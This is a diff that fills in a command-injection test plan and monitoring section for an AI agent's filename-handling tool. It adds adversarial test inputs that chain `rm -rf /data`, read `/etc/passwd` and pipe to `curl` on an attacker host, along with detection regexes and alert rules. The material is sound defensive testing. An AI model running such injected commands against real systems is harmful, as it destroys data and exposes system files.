@@ -100,12 +100,17 @@ Provide malicious input containing shell metacharacters:
 ### Test Cases
 | Test | Input | Expected | Failure Indicator |
 |------|-------|----------|-------------------|
-| [Test name] | [Input] | [Expected output] | [What indicates failure] |
+| Semicolon command chaining | `filename = "report.pdf'; rm -rf /data; echo '"` | `find` runs on the quoted filename only; `rm` never executes | `rm -rf` executes against the target directory |
+| Backtick command substitution | `filename = "$(cat /etc/passwd)"` | Substitution syntax treated as a literal filename, no match found | Contents of `/etc/passwd` appear in the tool output |
+| Pipe to external host | `filename = "report.pdf \| curl http://attacker.com/x"` | Pipe character rejected by allowlist before reaching the shell | Outbound `curl` request logged to `attacker.com` |
+| Clean legitimate filename | `filename = "Q3-report_final.pdf"` | `find` executes normally, file located | N/A (control case) |
 
 ### Metrics
 | Metric | Target | How to Measure |
 |--------|--------|----------------|
-| [Metric name] | [Target value] | [Measurement method] |
+| Injection block rate | 100% | % of adversarial inputs (shell metacharacters `; \| \` $() < > &`) rejected or safely escaped in the security regression suite |
+| `shell=True` call count in codebase | 0 | Static-analysis (Bandit/Semgrep) scan for `subprocess.run`/`os.system` calls with `shell=True` and model-generated arguments |
+| Legitimate-input false-rejection rate | < 1% | % of valid filenames (alphanumeric, hyphen, underscore, common extensions) incorrectly blocked by the allowlist |
 
 ---
 
@@ -154,12 +159,17 @@ Provide malicious input containing shell metacharacters:
 ### Key Metrics
 | Metric | Alert Threshold |
 |--------|-----------------|
-| [Metric name] | [Threshold] |
+| Shell metacharacter rejection count (per hour) | Sudden spike vs. 7-day rolling baseline |
+| `shell=True` invocations detected in production | > 0 |
+| Unexpected child processes spawned by agent host | > 0 beyond the documented command allowlist |
+| Command-injection regression test failures | > 0 |
 
 ### Alerts
 | Alert | Condition | Severity |
 |-------|-----------|----------|
-| [Alert name] | [Condition] | Critical |
+| Shell Metacharacter in Tool Input | Tool parameter matches injection regex (`;`, `\|`, `` ` ``, `$()`, `&&`) before sanitization | Critical |
+| Unexpected Child Process Spawned | Agent host process tree shows a child process not in the approved command allowlist | Critical |
+| `shell=True` Detected in Deployed Code | Static-analysis scan finds `shell=True` in a production branch/deploy | High |
 
 ---
 
